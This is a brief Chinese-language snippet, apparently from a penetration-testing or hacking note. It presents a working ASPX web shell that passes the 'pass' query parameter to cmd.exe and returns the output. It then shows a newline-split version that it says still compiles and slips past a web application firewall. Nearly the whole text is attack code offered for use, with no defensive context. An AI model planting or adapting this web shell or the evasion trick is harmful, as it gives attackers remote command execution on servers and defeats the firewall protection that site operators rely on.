如下aspx直接上传会被拦截
```
<%@ language = csharp %>
<%@ Import Namespace = System.Reflection %>
<%@ Import Namespace = System.Diagnostics %>
<%@ Import Namespace =System.IO %>
<%
ProcessStartInfo mypsi = new ProcessStartInfo();
mypsi.FileName = "cmd.exe";
mypsi.Arguments = "/C " + Request.QueryString["pass"];
mypsi.RedirectStandardOutput = true;
mypsi.UseShellExecute = false;
Process p = Process.Start(mypsi);
StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
Response.Write(s);
%>
```
经换行分割后，语法上仍有效，且waf不拦截，代码如下
```
<%
@
language
= 
csharp
%>
<%
@
Import
Namespace
=
System.Reflection
%>
<%
@ 
Import 
Namespace
=
System.Diagnostics
%>
<%
@
Import 
Namespace
=
System.IO
%>
<%
ProcessStartInfo 
mypsi 
= 
new 
ProcessStartInfo();
mypsi.FileName
=
"cmd.exe";
mypsi.Arguments
=
"/C "
+
Request.QueryString
[
"pass"
];
mypsi.RedirectStandardOutput
=
true;
mypsi.UseShellExecute
=
false;
Process
p
=
Process.Start(mypsi);
StreamReader
stmrdr
=
p.StandardOutput;
string
s
=
stmrdr.ReadToEnd();
Response.Write
(
s
);
%>
```